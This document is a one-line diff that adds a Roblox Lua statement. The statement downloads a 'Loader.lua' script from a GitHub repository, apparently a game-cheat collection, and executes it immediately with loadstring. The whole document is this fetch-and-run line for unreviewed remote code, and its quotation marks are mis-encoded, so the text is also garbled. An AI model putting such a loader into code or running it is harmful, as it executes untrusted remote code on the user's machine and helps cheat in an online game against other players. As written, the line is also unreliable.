@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(âhttps://raw.githubusercontent.com/Sw1ndlerScripts/AlphaZero/main/Loader.luaâ))()
